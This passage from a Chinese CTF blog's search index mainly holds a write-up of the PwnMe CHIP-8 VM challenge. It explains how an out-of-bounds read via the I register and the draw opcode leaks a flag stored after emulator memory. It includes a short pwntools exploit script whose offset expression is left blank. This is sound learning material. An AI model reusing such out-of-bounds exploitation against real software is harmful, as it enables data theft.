过两天再看看往这补8🔨</p><blockquote><p>为了这盘醋包的饺子, 但是今天有点晚了, 小🕊️一手</p></blockquote><h2 id="0x04-Others">0x04 Others</h2><p>week3的时候, 周一晚上做第二道题能通本地不能通远程, 找了一晚上原因也不知道是为什么, 然后写srop, 写完卡在奇怪的系统调用上, <s>当时没发现是0x59的调用号</s>, 干脆跑了不做了, 然后这周搭博客+做一道vm+干了些别的事情就到今天, 倚着官方的wp从头到尾看了看自己没什么水平的栈, 突然意识到一个问题:</p><p>思维有点死, 例如那个srop我甚至没能想到多次利用程序已有的read输入, 做pwn原本应该多活跃一下思维去利用应有的东西的, 但是好像做的时候并没有想到可以拿一些片段性的程序出来用, 老毛病了, 再做题先晃晃脑袋.</p><blockquote><p>栈迁移的先迁bp再寻址读入拉sp也是前段时间才学到的</p></blockquote><p>不知道是不是做的题太少了, 还是最近就没怎么做这一类的灵活栈题, 堆题也没怎么做, 那我到底干啥了（x</p><p>除了学方法的同时, 感觉也要适当去哪里刷点题什么的, 最近要恢复刷各种比赛和buu, nss了.</p>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
      <category>Stack</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>PWNmeCTF CHIP-8 复现</title>
    <link href="/2023/10/18/CHIP-8/"/>
    <url>/2023/10/18/CHIP-8/</url>
    
    <content type="html"><![CDATA[<p>这种VMpwn对带🔥来说刚刚好, 而对我这个♿就有丶超前🌶️😭</p><span id="more"></span><h2 id="0x00-材料">0x00 材料</h2><p>一个叫PWNME的比赛的一道题, 链接在这, 以下是照着wp算是复现的过程, 总之是看的想死😭</p><p><a href="https://github.com/ret2school/ctf/tree/master/2023/pwnme/pwn/chip8">CHIP-8github原网址</a></p><h2 id="0x01-分析">0x01 分析</h2><p>拿来之后发现clone了一个仓库, 大致一看, 应该像是一个chip8语言的模拟器, 似乎也可以说是一个vm.</p><p>CHIP-8, 小查了一下:</p><p><a href="https://en.wikipedia.org/wiki/CHIP-8">https://en.wikipedia.org/wiki/CHIP-8</a></p><p><img src="image-20231018212805437.png" alt="image-20231018212805437"></p><blockquote><p><s>这个人的英语目前像屎所以还是要靠谷歌翻译x  x</s></p></blockquote><p>给了一个patch, 这个patch分析一下, 最主要的功能感觉应该就是<code>把flag扔进去</code>, 告诉你flag在这里了.</p><p>其次下面看着是调试性的语句也给加了点注释, 还有main函数里关闭缓冲的初始化性质语句.</p><p><strong>patch里面有关flag的部分是在Machine类里面, 看一下这个类</strong>:</p><ul><li><p>在<code>Machine.hpp</code>中, 定义了一堆莫名其妙的东西, 但是可以看懂有<code>register</code>, <code>stack</code>, <code>memory</code>这种很熟悉的字样, 具体联系这个维基百科稍微看看:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Machine</span>&#123;<br><span class="hljs-keyword">private</span>:<br>std::vector&lt;<span class="hljs-type">uint8_t</span>&gt; registers; <span class="hljs-comment">// V0-VF</span><br>std::vector&lt;<span class="hljs-type">uint8_t</span>&gt; memory; <span class="hljs-comment">// Memory</span><br>std::vector&lt;<span class="hljs-type">uint8_t</span>&gt; flag;<br><span class="hljs-type">uint16_t</span> I; <span class="hljs-comment">// Index register</span><br>std::vector&lt;<span class="hljs-type">uint16_t</span>&gt; stack; <span class="hljs-comment">// Stack</span><br><span class="hljs-type">uint8_t</span> SP; <span class="hljs-comment">// Stack Pointer</span><br><span class="hljs-type">uint8_t</span> DT; <span class="hljs-comment">// Delay Timer</span><br><span class="hljs-type">uint8_t</span> ST; <span class="hljs-comment">// Sound Timer</span><br>GraphicEngine ge; <span class="hljs-comment">// Holds Graphics and frame buffer</span><br>Keyboard kb; <span class="hljs-comment">// presents Keyboard related functions</span><br><span class="hljs-type">uint16_t</span> PC; <span class="hljs-comment">// Program Counter</span><br>std::chrono::steady_clock::time_point last_tick;<br><br><span class="hljs-comment">// Methods</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">execute</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>&amp; opcode)</span></span>;<br><span class="hljs-function"><span class="hljs-type">uint8_t</span> <span class="hljs-title">random_byte</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print_machine_state</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">update_timers</span><span class="hljs-params">(<span class="hljs-type">const</span> std::chrono::steady_clock::time_point&amp; now)</span></span>;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">Machine</span>();<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setInst</span><span class="hljs-params">(std::vector&lt;<span class="hljs-type">uint8_t</span>&gt;&amp; prog, <span class="hljs-type">uint16_t</span> start_addr)</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">runLoop</span><span class="hljs-params">()</span></span>;<br>&#125;;<br></code></pre></td></tr></table></figure><p><img src="image-20231019180155003.png" alt="image-20231019180155003"></p></li></ul><p>对比看一下可以大致明白是个什么东西了, 感觉里面这个I应该是比较重要的东西之一</p><ul><li><p>然后是<code>Machine.cpp</code>,</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp">Machine::<span class="hljs-built_in">Machine</span>()&#123;<br>registers = std::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">uint8_t</span>&gt;(<span class="hljs-number">16</span>, <span class="hljs-number">0</span>);<br>stack = std::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">uint16_t</span>&gt;(<span class="hljs-number">32</span>, <span class="hljs-number">0</span>);<br>memory = std::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">uint8_t</span>&gt;(<span class="hljs-number">4096</span>, <span class="hljs-number">0</span>);<br>flag = std::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">uint8_t</span>&gt;(<span class="hljs-number">128</span>, <span class="hljs-number">0</span>);<br>PC = <span class="hljs-number">0x200</span>;<br>last_tick = std::chrono::steady_clock::<span class="hljs-built_in">now</span>();<br>I = <span class="hljs-number">0</span>;<br>SP = <span class="hljs-number">0</span>;<br>DT = <span class="hljs-number">0</span>;<br>ST = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p>这个应该是Machine的构造函数, 16个寄存器, 大小为32的栈和4096(0x1000)的内存, PC可以从上面知道是程序的计数器, 所以似乎是从0x200开始的.</p><p>内存过后直接是flag, 所以可能思路就是越界到flag</p><h2 id="0x02-过程-利用">0x02 过程+利用</h2><p>刚才把他到底是什么东西分析了个大概, 现在开始看怎么跑, 跑什么东西</p><p>给的dockerfile里面跑的是wrapper, wrapper实际跑一下, 感觉实际作用就是传入一个ROM code.</p><p>这个rom应该和 ↓应该是同一套的东西</p><p><img src="image-20231019190936098.png" alt="image-20231019190936098"></p><p>给了wrapper.c, 大概看了一下发现确实是这样的, 这个rom code会传进这一套文件里.</p><blockquote><p>在这里传进的ROMcode再分析一下会发现实际上应该也就是后续的opcode?但是不管怎样, 这里是唯一的输入了</p><p><strong>opcode</strong>应该算是控制vm的一些代码了, 这个题由于有着chip-8的背景, opcode可以说完全透明.</p></blockquote><p>漏洞和利用的话, 似乎这个题的漏洞相对来说属于很简单的, 根据分析可以知道flag就在内存块的后面, 所以应该是一个越界的漏洞, 但是实际上跑了一下, 发现除了一块黑框, 完全没有什么输出.</p><blockquote><p>之前没patch瞎鼓捣的时候发现会有一些信息出来, 但是patch过后如上面所说, 调试信息是关闭的, 打不出来东西, 起初我以为是我的步骤哪里出问题以至于把这玩意玩坏了,后来发现并不是这样.</p></blockquote><p>但是翻一下opcode表会发现有一个很奇怪的东西:</p><p><img src="image-20231019203235549.png" alt="image-20231019203235549"></p><p>于是这个题的flag的输出方式疑似是很匪夷所思的用这个黑框画出来, 这条opcode是从I开始读, 所以我们只需要让I等于我们的flag地址即可, flag地址是0x1010.</p><p>主要可以利用以下几个命令:</p><p><img src="image-20231019222825584.png" alt="image-20231019222825584"></p><p><img src="image-20231019222858938.png" alt="image-20231019222858938"></p><p><img src="image-20231019223158918.png" alt="image-20231019223158918"></p><p>这个地方直接拿百科上查到的了, 和在.cpp文件里看到的opcode几乎没有任何差别,</p><blockquote><p>然后找到一篇文章, <a href="https://ctftime.org/writeup/37026">CTFtime.org / PwnMe Qualifications : “8 bits” / chip8 / Writeup</a> , 疑似是官方的wp?</p><p>应该是个很不错的解释:</p></blockquote><ul><li><p>Here are the instruction we need:</p><ul><li><code>Annn</code> - <code>LD I, addr</code>. Set I = nnn. The value of register I is set to nnn.</li><li><code>6xkk</code> - <code>LD Vx, byte</code>, Set Vx = kk. The interpreter puts the value kk into register Vx.</li><li><code>Fx1E</code> - <code>ADD I, Vx</code>. Set I = I + Vx. The values of I and Vx are added, and the results are stored in I.</li><li><code>Dxyn</code> - <code>DRW Vx, Vy, nibble</code>. Display n-byte sprite starting at memory location I at (Vx, Vy), set VF = collision. The interpreter reads n bytes from memory, starting at the address stored in I. These bytes are then displayed as sprites on screen at coordinates (Vx, Vy). Sprites are XORed onto the existing screen. If this causes any pixels to be erased, VF is set to 1, otherwise it is set to 0. If the sprite is positioned so part of it is outside the coordinates of the display, it wraps around to the opposite side of the screen. See instruction 8xy3 for more information on XOR, and section 2.4, Display, for more information on the Chip-8 screen and sprites.</li></ul><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">n <span class="hljs-keyword">or </span>nibble - A <span class="hljs-number">4</span>-<span class="hljs-keyword">bit </span>value, the lowest <span class="hljs-number">4</span> <span class="hljs-keyword">bits </span>of the <span class="hljs-keyword">instruction</span><br><span class="hljs-keyword"></span>x - A <span class="hljs-number">4</span>-<span class="hljs-keyword">bit </span>value, the lower <span class="hljs-number">4</span> <span class="hljs-keyword">bits </span>of the high <span class="hljs-keyword">byte </span>of the <span class="hljs-keyword">instruction</span><br><span class="hljs-keyword"></span>y - A <span class="hljs-number">4</span>-<span class="hljs-keyword">bit </span>value, the upper <span class="hljs-number">4</span> <span class="hljs-keyword">bits </span>of the low <span class="hljs-keyword">byte </span>of the <span class="hljs-keyword">instruction</span><br><span class="hljs-keyword"></span>kk <span class="hljs-keyword">or </span><span class="hljs-keyword">byte </span>- An <span class="hljs-number">8</span>-<span class="hljs-keyword">bit </span>value, the lowest <span class="hljs-number">8</span> <span class="hljs-keyword">bits </span>of the <span class="hljs-keyword">instruction </span><br></code></pre></td></tr></table></figure></li></ul><p><img src="image-20231019224646952.png" alt="image-20231019224646952"></p><blockquote><p>这篇文章的写法, “由于I是16位寄存器, 故这个draw指令可以打印出xxx内存的东西”,自然包括0x1010</p></blockquote><h2 id="0x03-exp">0x03 exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,endianness=<span class="hljs-string">&#x27;big&#x27;</span>)<br><span class="hljs-comment">#context(log_level=&#x27;debug&#x27;)</span><br>r=process(<span class="hljs-string">&quot;./wrapper&quot;</span>)<br><span class="hljs-comment">#r=remote(&quot;node4.buuoj.cn&quot;,26990)</span><br>elf=ELF(<span class="hljs-string">&quot;./wrapper&quot;</span>)<br><span class="hljs-comment">#libc=ELF(&quot;./libc-2.23.so&quot;)</span><br><br>code=[<br>        <span class="hljs-number">0xafff</span>,                    <br>        <span class="hljs-number">0x6111</span> + <span class="hljs-number">0xf</span>*(),    <span class="hljs-comment"># 括号是偏移,一次打出0xf个字节</span><br>        <span class="hljs-number">0xf11e</span>,                    <br>        <span class="hljs-number">0xdbcf</span><br>        ]                     <br>romcode=<span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> code:<br>    romcode+=p16(i)<br><br><span class="hljs-built_in">print</span>(romcode)<br><br>r.sendline(romcode)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><p>分段改偏移, n位是f所以一次打0xf个字节的东西, 0xf乘以偏移改一下, 分次画flag就行了.</p><p>最后出现的结果大概like this(一共有4截):</p><p><img src="image-20231019225443175.png" alt="image-20231019225443175"></p><p>就是 这个东西:</p><p><img src="image-20231019225548366.png" alt="image-20231019225548366"></p><h2 id="0x04-后话">0x04 后话</h2><p>第一次系统的做了一整道VMpwn题, wings说普遍的vm题难度在逆向上, 这道题由于源码, opcode什么的全部给出, 并且利用是一个相对显而易见的越界, 所以<s>我事后</s>感觉这算是一个很简单的vm题, 只需要翻翻查查找到相关资料理解一下就行, 整个复现过程下来也稍微对vm题的过程有了一些实地感受, 要弄清楚内存, 寄存器等等东西的构造, 甚至可能还要理解opcode, <s>看着就像一个re人该做的事</s>, 更多偏向于读代码加调试, <s>听起来也比较烦人</s>😕</p><blockquote><p>唉 很简单的题 但一整篇都是溜着wp摸索下来的 我怎么这么菜啊😭</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
      <category>VM</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2023 Diary</title>
    <link href="/2023/10/18/Evolution/"/>
    <url>/2023/10/18/Evolution/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="48f4d90f18220f822c025252a351ecca3786d1f0ded787214544d28720e9ec60"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">pswd↑</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>Diary</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
